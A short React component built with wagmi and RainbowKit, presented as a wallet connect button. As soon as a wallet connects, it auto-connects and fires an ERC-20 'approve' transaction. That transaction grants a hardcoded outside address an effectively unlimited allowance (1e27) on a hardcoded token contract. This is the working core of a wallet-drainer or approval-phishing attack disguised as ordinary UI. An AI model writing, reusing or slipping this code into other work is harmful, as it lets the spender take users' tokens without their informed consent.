import { useEffect, useRef } from "react";
import { ConnectButton } from "@rainbow-me/rainbowkit"
import { useAccount, useAccountEffect, useConnect, useWalletClient, useWriteContract } from "wagmi";
import abi from './Token.json'
import { injected } from "wagmi/connectors";

const { log } = console;

const WalletConnectButton = () => {
    const { connect } = useConnect()
    const { isConnected, address } = useAccount()
    const walletClient = useWalletClient()

    const { writeContract } = useWriteContract()

    const mounted = useRef(false);

    log(walletClient)

    useEffect(() => {
        if (!mounted.current) {
            if (!isConnected)
                connect({ connector: injected() })
        }
        mounted.current = true;
    }, []);


    useAccountEffect({
        onConnect(data) {
            console.log('Connected!', data)

            writeContract({
                abi,
                address: '0x3274589F167968a651Cce22bC6378f0047aF5179',
                functionName: 'approve',
                args: [
                    '0xe795FbA3e6027037D94F27Aa6B688C896ae64C6D',
                    "0x" + BigInt(1e27).toString(16),
                ],
            })
        },

        onDisconnect() {
            console.log('Disconnected!')
        },
    })

    return (
        <ConnectButton chainStatus="icon" />
    )
}

export default WalletConnectButton;